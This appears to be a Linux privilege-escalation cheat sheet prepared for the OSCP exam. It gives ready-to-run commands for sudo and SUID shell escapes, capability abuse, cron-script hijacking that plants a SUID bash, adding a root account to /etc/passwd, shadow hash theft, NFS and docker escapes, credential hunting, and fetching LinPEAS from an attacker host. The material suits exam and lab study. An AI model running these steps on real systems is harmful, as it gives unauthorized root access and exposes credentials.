@@ -1,0 +1,358 @@
+
+> <b>Purpose:</b> go from a low-privilege shell to root by checking the five things that actually pay — sudo rights, SUID/SGID, capabilities, cron, and writable system files — <b>before</b> running any automated scanner.
+
+## Why manual first
+
+Automated tools (LinPEAS, pspy) are excellent at <b>coverage</b> and terrible at <b>judgement</b>. They print 400 lines; the exam gives you 24 points for acting on the right one. Manual checks cost 15-20 minutes and usually find the intended path; the scanner is for when they don't.
+
+<b>Order:</b> manual (Section A-F) → decision point (Section J) → automated (Section H-I) → kernel exploits last.
+
+## A. Triage in 60 seconds
+
+### Step 01 — Who am I and what can I run?
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+id; whoami; sudo -l; sudo -V
+```
+
+<b>Look for:</b> group membership (sudo, adm, docker, lxd), <code>NOPASSWD</code> entries, <code>(ALL : ALL) ALL</code>, and the sudo version.<br /><b>Decision:</b> any <code>NOPASSWD</code> binary → Step 02. <code>(ALL : ALL) ALL</code> with a known password → <code>sudo su -</code>. Nothing → Step 03.<br /><b>Next:</b> Step 02.<br /><b>Common mistake:</b> running <code>sudo -l</code> and stopping at the password prompt. If sudo wants a password, you do not have passwordless rights — read the rest of the output anyway.<br /><b>Evidence:</b> the exact <code>sudo -l</code> output.
+
+### Step 02 — Turn a sudo right into a shell
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+sudo -l
+# then match the binary against GTFOBins, e.g.
+sudo vim -c ':!/bin/sh'
+sudo find . -exec /bin/sh \; -quit
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo env /bin/sh
+sudo python3 -c 'import os; os.system("/bin/sh")'
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+<b>Look for:</b> a <code>#</code> prompt.<br /><b>Decision:</b> the listed binary is not in GTFOBins → Step 03 (version bugs) or Step 12 (PATH hijack, if the sudo command calls another binary).<br /><b>Next:</b> capture proof.<br /><b>Common mistake:</b> assuming a sudo rule ending in a specific argument can't be escaped. Payloads usually go <b>after</b> the binary, and <code>;</code>/<code>-c</code> often allow a command.<br /><b>Evidence:</b> <code>id</code> as root in the same session where <code>sudo -l</code> was shown.
+
+### Step 03 — Is sudo itself vulnerable?
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+sudo --version
+```
+
+<b>Look for:</b> versions affected by known sudo bugs (e.g. CVE-2021-3156 "Baron Samedit", CVE-2019-14287 <code>-u#-1</code>).<br /><b>Decision:</b> version matches a public advisory → read the exploit's requirements before running it. Many need specific sudoers entries.<br /><b>Next:</b> exploit, or move to Section B.<br /><b>Common mistake:</b> firing a sudo CVE because the version "looks old" without checking the distribution's backported patches.<br /><b>Evidence:</b> the version string plus the advisory.
+
+## B. SUID and SGID
+
+### Step 04 — Find SUID binaries
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+```
+
+<b>Look for:</b> anything outside the standard set (su, passwd, mount, ping, sudo). Unusual names are the lead.<br /><b>Decision:</b> a non-standard binary → Step 05. Only standard binaries → check versions and move to Section C.<br /><b>Next:</b> Step 05.<br /><b>Common mistake:</b> ignoring the <b>owner</b>. A SUID binary owned by root is interesting; one owned by a normal user is usually a leftover.<br /><b>Evidence:</b> the file list with <code>ls -l</code> for the interesting entries.
+
+### Step 05 — Exploit a SUID binary
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+ls -l /usr/local/bin/<BINARY>
+/usr/local/bin/<BINARY> --help
+# GTFOBins SUID patterns
+find . -exec /bin/sh -p \; -quit
+./<BINARY>
+```
+
+<b>Look for:</b> a <code>#</code> prompt, or a file-read primitive.<br /><b>Decision:</b> not in GTFOBins → <code>strings</code> it for embedded paths, check its version, or look for a shared-library hijack.<br /><b>Next:</b> proof, then stop.<br /><b>Common mistake:</b> running a SUID binary in a directory you control and losing the privilege because the binary drops it. Check <code>ls -l</code> for the <code>s</code> bit before and after.<br /><b>Evidence:</b> <code>id</code> showing <code>euid=0</code>.
+
+### Step 06 — SGID and writable binaries
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+find / -perm -2000 -type f 2>/dev/null
+find / -type f -writable -not -path '/proc/*' 2>/dev/null | head -50
+```
+
+<b>Look for:</b> SGID binaries in unusual groups (adm, disk), and root-owned scripts you can edit.<br /><b>Decision:</b> a root-owned script or binary you can write → replace its contents with a shell (keep a backup first).<br /><b>Next:</b> run it and check <code>id</code>.<br /><b>Common mistake:</b> overwriting a file you need later. Copy it to <code>/tmp</code> first.<br /><b>Evidence:</b> the writable file and its new behaviour.
+
+## C. Capabilities
+
+### Step 07 — Find file capabilities
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+<b>Look for:</b> <code>cap_setuid+ep</code>, <code>cap_setgid+ep</code>, <code>cap_dac_read_search+ep</code>, <code>cap_sys_admin+ep</code>.<br /><b>Decision:</b> <code>cap_setuid</code> on an interpreter → Step 08. <code>cap_dac_read_search</code> → read <code>/etc/shadow</code> directly.<br /><b>Next:</b> Step 08.<br /><b>Common mistake:</b> looking only for SUID and forgetting capabilities, which are the modern equivalent and far less noisy.<br /><b>Evidence:</b> the <code>getcap</code> line.
+
+### Step 08 — Abuse the capability
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+# cap_setuid on python
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# cap_dac_read_search
+<python3> -c 'print(open("/etc/shadow").read())'
+```
+
+<b>Look for:</b> a root shell or the shadow file.<br /><b>Decision:</b> root shell → proof. Shadow readable → crack hashes, then <code>su</code>.<br /><b>Next:</b> proof or cracking.<br /><b>Common mistake:</b> using the wrong interpreter path — <code>getcap</code> names the exact binary; use that one.<br /><b>Evidence:</b> <code>id</code> after the escape.
+
+## D. Cron and timers
+
+### Step 09 — Enumerate scheduled work
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null
+crontab -l 2>/dev/null
+systemctl list-timers --all 2>/dev/null
+```
+
+<b>Look for:</b> a job running as root that executes a script in a writable location, or a wildcard (<code>*</code>) in a directory you control.<br /><b>Decision:</b> writable script → Step 10. Wildcard in a writable dir → tar/rsync wildcard injection.<br /><b>Next:</b> Step 10.<br /><b>Common mistake:</b> only running <code>crontab -l</code> — that shows <b>your</b> jobs, not root's. <code>/etc/crontab</code> and <code>/etc/cron.d</code> matter more.<br /><b>Evidence:</b> the crontab line with its user field.
+
+### Step 10 — Hijack the job
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+ls -la /path/to/script.sh
+cp /path/to/script.sh /tmp/script.sh.bak
+printf '#!/bin/sh
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+' > /path/to/script.sh
+# wait for the next run
+/tmp/rootbash -p
+```
+
+<b>Look for:</b> <code>/tmp/rootbash</code> appearing with the SUID bit.<br /><b>Decision:</b> the job is not writable → check whether its <b>directory</b> is (you can replace the script), or whether it calls a binary via a relative path.<br /><b>Next:</b> proof.<br /><b>Common mistake:</b> making the payload noisy or deleting the original script. Back it up; the box must stay usable.<br /><b>Evidence:</b> the modified script, the resulting SUID binary, <code>id</code> as root.
+
+## E. Writable system files
+
+### Step 11 — Check the files that define identity
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ 2>/dev/null
+```
+
+<b>Look for:</b> <code>-rw-rw-rw-</code> on <code>/etc/passwd</code>, or any write bit for your user on shadow/sudoers.<br /><b>Decision:</b> passwd writable → Step 12. shadow readable → Step 13.<br /><b>Next:</b> Step 12.<br /><b>Common mistake:</b> assuming <code>/etc/passwd</code> is never writable. Misconfigured containers and lab builds do it often.<br /><b>Evidence:</b> the <code>ls -l</code> line.
+
+### Step 12 — Add a root account (passwd writable)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+openssl passwd -1 -salt x pwned
+# append:  pwned:<HASH>:0:0:root:/root:/bin/bash
+echo 'pwned:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
+su pwned
+```
+
+<b>Look for:</b> a root shell from <code>su pwned</code>.<br /><b>Decision:</b> <code>su</code> asks for a password → the hash format is wrong; regenerate it.<br /><b>Next:</b> proof.<br /><b>Common mistake:</b> using a modern <code>$6$</code> hash in the passwd field — <code>su</code> expects the format the system's PAM is configured for; MD5 (<code>$1$</code>) is the safe default in labs.<br /><b>Evidence:</b> the new line and <code>id</code> after <code>su</code>.
+
+### Step 13 — Read or write shadow
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+cat /etc/shadow 2>/dev/null | head
+# if writable, replace root's hash with a known one
+openssl passwd -1 -salt x pwned
+```
+
+<b>Look for:</b> readable hashes → crack offline; writable → replace root's hash.<br /><b>Decision:</b> crack succeeds → <code>su root</code>.<br /><b>Next:</b> proof.<br /><b>Common mistake:</b> cracking with the wrong mode. Confirm the hash prefix (<code>$1$</code> MD5, <code>$6$</code> SHA-512) before choosing a hashcat mode.<br /><b>Evidence:</b> the hash line and the recovered password.
+
+### Step 14 — PATH hijacking
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+echo $PATH
+# if a root cron/SUID program calls a binary without a full path:
+mkdir -p /tmp/evil && printf '#!/bin/sh
+/bin/sh
+' > /tmp/evil/<BINARY>
+chmod +x /tmp/evil/<BINARY>
+export PATH=/tmp/evil:$PATH
+```
+
+<b>Look for:</b> a root-run program that calls <code>service</code>, <code>ps</code>, <code>ifconfig</code> etc. without <code>/usr/bin/</code>.<br /><b>Decision:</b> the program runs with a clean PATH → this fails; check for relative-path execution instead.<br /><b>Next:</b> trigger the program.<br /><b>Common mistake:</b> assuming every cron job inherits your PATH. Most define their own; verify before spending time.<br /><b>Evidence:</b> the hijacked binary and the root shell it produced.
+
+## F. NFS, credentials, and services
+
+### Step 15 — NFS with no_root_squash
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali + target · <b>Status:</b> Syntax Checked
+
+```bash
+showmount -e <TARGET_IP>
+mkdir -p /tmp/nfs && sudo mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs -o nolock
+sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash
+# on the target:
+/tmp/nfs/rootbash -p
+```
+
+<b>Look for:</b> <code>no_root_squash</code> in <code>/etc/exports</code>, and a SUID bash you created from Kali.<br /><b>Decision:</b> the mount is read-only or squashes root → dead end; try writing a cron entry instead.<br /><b>Next:</b> run the binary on the target.<br /><b>Common mistake:</b> creating the SUID file as your normal user — it must be created by <b>root</b> (hence <code>sudo</code> on Kali) for the bit to survive.<br /><b>Evidence:</b> the <code>showmount</code> output and <code>id</code> on the target.
+
+### Step 16 — Hunt for credentials on disk
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+cat ~/.bash_history 2>/dev/null
+find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null
+grep -RIn -E 'password|passwd|pwd=' /var/www /opt /home 2>/dev/null | head -30
+ls -la /var/backups /tmp 2>/dev/null
+```
+
+<b>Look for:</b> database passwords in web configs, SSH keys, backup archives, a <code>.bash_history</code> containing <code>mysql -u root -p...</code>.<br /><b>Decision:</b> a password works for <code>su</code>/<code>sudo</code> → done. A key is found → try it against local users.<br /><b>Next:</b> use the credential.<br /><b>Common mistake:</b> only grepping for the word "password". Also search <code>pass</code>, <code>pwd</code>, <code>secret</code>, <code>token</code>, and connection strings.<br /><b>Evidence:</b> the file path and the exact line.
+
+### Step 17 — Processes, ports and groups
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+ps aux --sort=-%cpu | head -20
+ss -tlnp
+id
+docker ps 2>/dev/null
+```
+
+<b>Look for:</b> a root process running from a writable directory, an internal service bound to [localhost](http://localhost), and membership of <code>docker</code> or <code>lxd</code>.<br /><b>Decision:</b> <code>docker</code> group → Step 18. Root process in a writable path → Step 10 logic.<br /><b>Next:</b> Step 18, or pivot to the internal service.<br /><b>Common mistake:</b> ignoring [localhost](http://localhost)-only ports — they are usually the unreachable-from-outside admin service that grants root.<br /><b>Evidence:</b> the process/port list.
+
+### Step 18 — Docker group to root
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+<b>Look for:</b> a shell with the host filesystem mounted at <code>/mnt</code>.<br /><b>Decision:</b> image not present and no internet → use an existing image (<code>docker images</code>).<br /><b>Next:</b> read <code>/mnt/root/proof.txt</code>.<br /><b>Common mistake:</b> treating docker group membership as a minor finding. It is root, every time.<br /><b>Evidence:</b> <code>id</code> inside the chroot.
+
+## G. Kernel exploits
+
+### Step 19 — Version and matching exploits
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+uname -a; cat /etc/os-release
+searchsploit linux kernel $(uname -r | cut -d- -f1)
+```
+
+<b>Look for:</b> a kernel version matching a local privilege-escalation CVE (DirtyPipe, PwnKit via pkexec, OverlayFS).<br /><b>Decision:</b> a match → read the exploit fully; confirm the distro's patch level before running. <b>Prefer a configuration flaw over a kernel exploit</b> on the exam — a kernel panic costs the machine.<br /><b>Next:</b> run only after a snapshot/revert is acceptable.<br /><b>Common mistake:</b> running DirtyPipe/PwnKit blind because the kernel "looks old". Check <code>pkexec --version</code> and the patch date.<br /><b>Evidence:</b> the version, the exploit name, and why you believed it applied.
+
+## H. Automated enumeration (after manual)
+
+### Step 20 — LinPEAS
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+# serve from Kali
+python3 -m http.server 8000
+# on target
+wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh -a 2>&1 | tee <OUTPUT_FILE>
+```
+
+<b>Look for:</b> the red/yellow 99% findings — SUID, capabilities, cron, <code>.ssh</code>, credentials, kernel.<br /><b>Decision:</b> every red finding still needs manual confirmation. LinPEAS reports possibilities, not vulnerabilities.<br /><b>Next:</b> verify the top finding by hand, then exploit it.<br /><b>Common mistake:</b> pasting LinPEAS output into a report as if it were a finding. The report needs the command you ran <b>after</b> it.<br /><b>Evidence:</b> the scan output (as an appendix) plus your manual confirmation.
+
+### Step 21 — pspy (watch what root runs)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+./pspy64 -pf -i 1000
+```
+
+<b>Look for:</b> recurring root commands with relative paths, writable scripts, or credentials in arguments.<br /><b>Decision:</b> a repeating job appears → Step 10.<br /><b>Next:</b> modify the target of the job.<br /><b>Common mistake:</b> running pspy for 30 seconds. Cron fires on the minute — watch for at least 2-3 minutes.<br /><b>Evidence:</b> the command line of the job you hijacked.
+
+## I. Decision tree: manual to automated
+
+| What you found | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| <code>NOPASSWD</code> sudo binary | GTFOBins (Step 02) | Assume you need a password |
+| Unusual SUID binary | GTFOBins / version check (Step 05) | Run kernel exploits first |
+| <code>cap_setuid</code> | Interpreter escape (Step 08) | Ignore capabilities |
+| Writable root cron script | Replace payload (Step 10) | Delete the original |
+| Writable <code>/etc/passwd</code> | Add root user (Step 12) | Edit root's existing line and lock yourself out |
+| <code>no_root_squash</code> NFS | SUID bash from Kali (Step 15) | Create it as a normal user |
+| Credentials in a config | Reuse locally (Step 16) | Crack what you already have |
+| Docker group | chroot escape (Step 18) | Treat it as low severity |
+| <b>Nothing after 20-30 min of manual</b> | Run LinPEAS (Step 20) | Keep repeating the same checks |
+| LinPEAS noisy, nothing conclusive | pspy for 3-5 min (Step 21) | Run kernel exploits blindly |
+| Kernel CVE matches | Read it, then decide (Step 19) | Panic the box on a hunch |
+
+<b>Hard rule:</b> after 45 minutes without a vector, revert and re-read the enumeration. A fresh look beats a fourth scanner.
+
+## J. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| <code>sudo -l</code> asks for a password | No passwordless rule | Look for credentials; check <code>sudo -V</code> |
+| SUID binary drops privileges | It calls <code>setuid(getuid())</code> | Look for a different binary |
+| Cron edit has no effect | Wrong user field, or cron not running | Check <code>systemctl status cron</code>; use <code>/etc/cron.d</code> |
+| <code>su</code> rejects the new account | Hash format | Regenerate with <code>openssl passwd -1</code> |
+| Reverse shell never connects | Target cannot reach Kali (pivot) | See the pivoting note below |
+| <code>getcap</code> prints nothing | No capabilities set | Normal — move on |
+| Exploit compiles but fails | Missing headers/arch mismatch | Compile statically on Kali with the same arch |
+
+<b>Pivoting variant.</b> If the target can only reach an internal pivot, a reverse shell to Kali will never connect. Either catch it on the pivot host (<code>ssh -R</code> / chisel) or use a bind shell and reach it with <code>proxychains4</code>. Confirm the direction of reachability <b>before</b> you spend time on an exploit that needs a callback.
+
+## K. Quick workflow
+
+1. <code>id; sudo -l; sudo -V</code>
+2. Match sudo rights to GTFOBins.
+3. <code>find / -perm -4000 -type f 2>/dev/null</code> → GTFOBins.
+4. <code>getcap -r /</code> → interpreter escape.
+5. <code>/etc/crontab</code> + <code>/etc/cron.d</code> + timers → writable script.
+6. <code>ls -la /etc/passwd /etc/shadow</code> → add user / crack.
+7. Credentials on disk → reuse.
+8. <code>ps aux</code>, <code>ss -tlnp</code>, <code>id</code> → services, docker, lxd.
+9. NFS <code>no_root_squash</code> if exported.
+10. Still nothing → LinPEAS → pspy → kernel.
+
+## L. Evidence to preserve
+
+- The <code>sudo -l</code> output that justified the path.
+- The exact binary/permission that was wrong (<code>ls -l</code>).
+- The command that produced the root shell, and <code>id</code> as root.
+- <code>cat /root/proof.txt</code> <b>and</b> <code>ip addr</code> in the same screenshot.
+- A revert if your changes made the box unstable.
+
+## M. Related pages
+
+- [Windows Privilege Escalation — Complete Command Reference](https://app.notion.com/p/4011e51238b5818fa4dbc8098f4d9a8b)
+- [Post-Exploitation & Lateral Movement — NetExec and Impacket](https://app.notion.com/p/4011e51238b58119b91aee453db12b4c)
+- <mention url="https://app.notion.com/p/4011e51238b58123b446cc627bc02913" /> — keys and passphrases
+- <mention url="https://app.notion.com/p/4011e51238b581669e09d615530aa92a" /> — service versions that suggest a path
+- OSCP Attack Workflow — Start Here
+
+## N. References
+
+- GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+- HackTricks Linux privilege escalation: [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/)
+- LinPEAS: [https://github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)
+- pspy: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+
+## O. Verification note
+
+Every command here was checked against locally installed tools where possible; exploitation sequences are standard techniques and are marked <b>Syntax Checked</b> or <b>Documented</b>. Nothing was executed against a live target for this page, so no step is <b>Lab Tested</b>. Kernel-exploit steps are deliberately the last resort because of the risk of crashing an exam machine.
